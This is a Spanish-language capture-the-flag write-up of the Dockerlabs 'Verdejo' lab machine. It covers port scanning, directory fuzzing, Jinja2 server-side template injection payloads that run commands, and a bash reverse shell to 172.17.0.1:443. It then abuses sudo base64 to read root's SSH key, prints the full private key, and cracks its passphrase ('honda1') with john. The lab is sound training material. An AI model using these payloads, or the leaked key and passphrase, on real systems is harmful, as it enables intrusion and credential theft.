---
layout: single
title: Verdejo - Dockerlabs
excerpt: "Hacking"
date: 2021-05-22
classes: wide
header:
  teaser: /assets/images/Dockerlabs-Verdejo/labbar.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs_icon.png
categories:
  - Writeup
---

<iframe width="560" height="315" src="https://www.youtube.com/embed/_q1izR4c0mg" 
title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; 
encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>




-------------
# Escaneo y Reconocimiento de puertos

Una vez tengamos la máquina desplegada lo primero que haremos será lanzarle un *ping* para comprobar que la podemos detectar bien y no hay ningun problema, esto lo haremos con el comando:

`ping -c 1 172.17.0.2` 

y nos devuelve un *TTL=64* lo que nos indica que estamos ante una máquina *Linux*

Ahora lo que vamos a realizar es un escaneo con *nmap* para descubrir que puertos están abiertos en nuestra máquina victima.
lo haremos con el siguiente comando:

``nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv [IP] ``  

- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa mientras se realiza el escaneo.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `ip`: La dirección IP del host objetivo.
- `--top-ports`: Escanea los 500 puertos mas comunes.

Y nos reporta:

*Puerto: 22 - SSH
Puerto 80 - HTTP
Puerto 8089 Unknow*

![[IMGs/images/Pasted image 20240527081316.png]]

Una vez que conocemos los puertos que hay abiertos vamos a utilizar de nuevo *nmap* pero esta vez para enviar una serie de *scripts* de reconocimiento para averiguar los servicios y las versiones que están corriendo por dichos puertos, y lo haremos con el siguiente comando:

````ruby
nmap -sCV -p80 -vvv -oN versionPorts [IP]
````


- `-sCV`: Escaneo básico de reconocimiento de versiones y vulnerabilidades.
- `-p80`: Escaneo de los puertos 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `ip`: Dirección IP del host escaneado.

# Enumeración Web

Una ves que hemos visto los puertos que están abiertos en la web vamos a irnos a ver que vemos si accedemos a ella a través de nuestro navegador.

cuando entramos en la dirección `172.17.0.2`  no encontramos gran cosa, simplemente la página por defecto de *Apache* , esto no nos arroja mayor información. 
Asique lo que podemos hacer ahora es intentar hacer *Fuzzing Web* para intentar descubrir directorios ocultos.

Usaremos *Gobuster* para hacer un reconocimiento web y ver que directorios podemos encontrar ocultos.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`

- `dir -u` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de archivos queremos que nos busque

Tras lanzar el escaneo vemos que nos reporta un directorio llamado: 
*/javascript* -> Así que vamos a ver que nos encontramos al acceder a ese directorio.

![[IMGs/images/Pasted image 20240527082502.png]]

Al probarlo vemos que nos arroja un estado *Forbideen* y no podemos acceder, asique ahora vamos a ver que nos encontramos por el puerto *8089*

Y al entrar nos encontramos con un panel que nos pone lo siguiente:

![[IMGs/images/Pasted image 20240527082710.png]]

Vemos un cuadrado en el que podemos ingresar texto y vemos que hay un botón con el que también podemos interactuar.

Y si le *escribirmos algo y lo "enviamos"* nos arroja lo siguiente:

![[IMGs/images/Pasted image 20240527082827.png]]

Como podemos comprobar que nos está interpretando lo que le estamos enviando, vamos a probar a ver si la web es vulnerable a *HTML injection* , esto lo haremos lo mas sencillo que podamos, puesto que es simplemente para probar:

Lo haremos de la siguiente manera:
En la dirección *URL* pondremos lo siguiente: 

``http://172.17.0.2:8089/?user=<h1>HTMLinjection</h1>``

![[IMGs/images/Pasted image 20240527083610.png]]

Y vemos que nos arroja esto por lo que podemos comprobar que efectivamente nos está interpretando el código que le estamos poniendo.

Ahora por lo que he podido leer y he podido averiguar en estos casos debemos probar a ver si desde el lado del servidor también es vulnerable y lo más básico y más sencillo es probar a añadirle al iual que antes:

``http://172.17.0.2:8089/?user={{3*4}} ``  y comprobar si nos lo interpreta.

![[IMGs/images/Pasted image 20240527084023.png]]

Y como podemos ver si nos lo a interpretado, esto es un tipo de vulnerabilidad llamada:
inyección STTI (Server-Side Template Injection) .

Como hemos comprobado que es vulnerable a SSTI lo que deberíamos hacer ahora es buscar un payload el cual nos permita ejecutar comando de forma remota *(RCE)*
``https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection``
**RECURSO** #ninja2injection #injection 

Y ahora tengo por aquí apuntado un *payload* que encontré en un repositorio de *Github* mientras buscaba información acerca de esta vulnerabilidad y como explotarla:

`{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

---------------------------------------

`Desglosemos lo que hace este payload paso a paso:

1. **`self.__init__`**: Accede al método de inicialización del objeto actual.
2. **`.__globals__`**: Accede a los globales del método `__init__`, que son los mismos que los globales del módulo en el que fue definido.
3. **`.__builtins__`**: Accede al diccionario de builtins de Python, que incluye todas las funciones y variables integradas disponibles en Python.
4. **`.__import__('os')`**: Utiliza la función `__import__` para importar el módulo `os`.
5. **`.popen('id').read()`**: Llama al método `popen` del módulo `os` para ejecutar el comando `id` en el sistema operativo y luego lee la salida del comando.`


--------------------------
Y cuando inyectamos el siguiente payload:
`{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read() }}`
Lo que nos devuelve es lo siguiente: 

![[IMGs/images/Pasted image 20240527085127.png]]

Y con esto podemos asegurar que es vulnerable a *RCE* .
**¿Y ahora què?**

Ahora podríamos intentar enviarnos una revershell de la misma manera que hemos logrado inyectar el comando *id*. Este parte se puede hacer de muchas formas.   Nos vamos a nuestra terminal y nos vamos a poner a la escucha con *Netcat*  

`nc -nlvp 443`, 

y ahora nos vamos al cuadro de dialogo que vimos anteriormente y pegaremos nuestro payload e  intentaremos mandar la reverse shell con el siguiente *payload*:

`http://172.17.0.2:8089/?user={{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read()}}`

![[IMGs/images/Pasted image 20240527090356.png]]

**Y ya hemos conseguido meternos en la máquina victima**


![[IMGs/images/Pasted image 20240527090413.png]]

Con el comando *id* vamos a comprobar que usuario somos.

![[IMGs/images/Pasted image 20240527090513.png]]

### Escalada de privilegios

Ahora toca la parte de la escalada de privilegios, que como siempre yo voy a empezar con el comando:

`sudo -l` Para comprobar que puedo utilizar de forma temporal como el usuario *root* y así intentar la escalada de privilegios.
`-l` ⮞ listar comandos que podemos ejecutar como sudo
Y vemos que podemos utilizar el *binario base 64*

Entonces mirando en [GTFOBins](https://gtfobins.github.io/) podemos ver que nos permite leer cualquier archivo  indicando  lo siguiente -> `sudo base64 "file_to_read" | base64 --decode`. Entonces como sabemos que tiene el puerto 22 abierto es decir el ssh, nos interesaría apuntar al *id_rsa del root* 

``sudo base64 /root/.ssh/id_rsa | base64 --decode``

y con esto obtendremos el *id_rsa* de *root*

*-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----*

Y ahora como hicimos en la maquina anterior, con la herramienta *JhonTheRipper* tenemos que pasar esta 
`key a un hash` :

`ssh2john id_rsa > hash` 

![[IMGs/images/Pasted image 20240527092043.png]]

Una vez hayamos pasado la *key* a *hash* con el comando:

``john key.hash --wordlist /usr/share/wordlists/rockyou.txt`` intentaremos crackear la contraseña.

Y tras esperar un poco nos encuentra que la clave es : **honda1**

![[IMGs/images/Pasted image 20240527092451.png]]

con `john hash --show`

![[IMGs/images/Pasted image 20240527093639.png]]

**EL ERROR DE CONEXIÓN LO SOLUCIONAMOS CON:**
`rm -r~/.ssh/known_hosts` 


Y ahora si le damos permiso al archivito *id_rsa* con el comando *chmod 600 id_rsa* 
Podriamos intentar conectarnos como *root* y no nos deberia arrojar ningun error.

``sudo ssh -i id_rsa root@172.17.0.2`` , tras ejecutar esto le tenemos que añadir la *key* que en este caso ya sabemos que es *honda1* y seremos usuario *root*

![[IMGs/images/Pasted image 20240527101113.png]]



--------------------------

### Explicación inyección STTI (Server-Side Template Injection) :

**La inyección SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad web que ocurre cuando una aplicación web permite a un atacante inyectar código malicioso en las plantillas del lado del servidor. Estas plantillas se utilizan para generar contenido dinámico en la web. Si el código inyectado se ejecuta, el atacante puede tomar control parcial o total del servidor web, accediendo a información sensible o ejecutando comandos arbitrarios.**

### Impacto de la Inyección SSTI

- **Ejecución Remota de Código (RCE)**: El atacante puede ejecutar comandos arbitrarios en el servidor.
- **Acceso a Datos Sensibles**: El atacante puede acceder a variables del entorno, configuraciones, y datos confidenciales.
- **Escalamiento de Privilegios**: El atacante puede obtener control administrativo del servidor.
- **Destrucción de Datos**: El atacante puede modificar o eliminar datos en el servidor.

------------------






